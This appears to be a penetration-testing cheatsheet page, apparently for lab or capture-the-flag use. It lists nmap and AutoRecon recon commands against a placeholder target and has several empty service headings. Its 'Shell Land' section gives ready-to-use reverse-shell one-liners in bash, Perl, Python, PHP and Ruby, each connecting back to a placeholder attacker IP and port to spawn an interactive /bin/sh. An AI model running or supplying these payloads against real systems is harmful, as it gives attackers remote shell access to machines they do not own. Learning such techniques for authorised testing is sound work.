---
sort: 1
---

# Cheatsheet

Tips on automated tools
> These tools help automate nmap/gobuster/nikto etc and doesn't automatically test exploits

## Nmap
[nmapAutomator](https://github.com/21y4d/nmapAutomator) by 21y4d
```
nmapAutomator.sh <TARGET-IP> <TYPE>
                                                      
Scan Types:                                           
        Quick:  Shows all open ports quickly (~15 seconds)                                                  
        Basic:  Runs Quick Scan, then runs a more thorough scan on found ports (~5 minutes)                 
        UDP:    Runs "Basic" on UDP ports (~5 minutes)
        Full:   Runs a full range port scan, then runs a thorough scan on new ports (~5-10 minutes)         
        Vulns:  Runs CVE scan and nmap Vulns scan on all found ports (~5-15 minutes)                        
        Recon:  Suggests recon commands, then prompts to automatically run them                             
        All:    Runs all the scans (~20-30 minutes)   
```
Scan one IP at a time, All scans: nmap quick/udp(if sudo)/allports/vuln script/cve scan, web(Have gobuster+Nikto installed) 

```scss
nmapAutomator $TARGETip All
```

[AutoRecon](https://github.com/Tib3rius/AutoRecon) by Tib3rius
```
usage: autorecon [-h] [-t TARGET_FILE]                                                                             
                 [-ct <number>] [-cs <number>]                                                                     
                 [--profile PROFILE_NAME]                                                                          
                 [-o OUTPUT_DIR] [--single-target]                                                                 
                 [--only-scans-dir]                                                                                
                 [--heartbeat HEARTBEAT]                                                                           
                 [--nmap NMAP | --nmap-append NMAP_APP                                                             END]                                                                                                               
                 [-v] [--disable-sanity-checks]                                                                    
                 [targets [targets ...]]

Network reconnaissance tool to port scan and automatically enumerate services found on multiple
targets.
```
Can very, recommend to do one IP at a time because the VMs can be very slow
```scss
autorecon $TARGETip -o /destinationfile --single-target
```

General Enumeration/Recon with Nmap
```scss
//Initial
nmap -Pn -n -v -oN nmap/Initial $TARGETip

//Partial
nmap -Pn -n -v -p1-500 -oN nmap/partial $TARGETip

//AllPorts
nmap -Pn -n -v -p- -oN nmap/allports $TARGETip

//Targeted, specifiy which -pPORT to target
nmap -Pn -n -v -p22,80,139 -oN nmap/targeted $TARGETip

//UDP
sudo nmap -Pn -n -v -sU -oN nmap/udp $TARGETip

```
## File Transfers (FTP) - Port 21
## Secure Shell (SSH) - Port 22
## Domain Name System (DNS) - Port 53
## Hypertext Transfer (HTTP/S) - Port 80/443 
## Mail (POP3/SNMP) - Port 110/161 
## File Sharess (NFS|SMB) - Port 2049 | 139/445

## Shell Land
Find a command execution vulnerability -> get an interactive shell

Examples should work cross to the windows platform and subsitute '/bin/sh -i' with 'cmd.exe'

Citing pentestmonkey's blog post:

    If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell. 

    [...] your next step is likely to be either throwing back a reverse shell or binding a shell to a TCP port. 

    Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.

### Linux
**Change $ATTACKIP & $PORT**

```scss
//BASH

bash -i >& /dev/tcp/$ATTACKIP/$PORT 0>&1

//PERL

perl -e 'use Socket;$i="$attackip";$p=$port;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");};'


//PYTHON

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((" $ATTACKIP ",$PORT));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'

//PHP

php -r '$sock=fsockopen(" $ATTACKIP ",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

//RUBY

ruby -rsocket -e'f=TCPSocket.open(" $ATTACKIP ",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

//NetCat
//Java
//xterm


```
### Windows

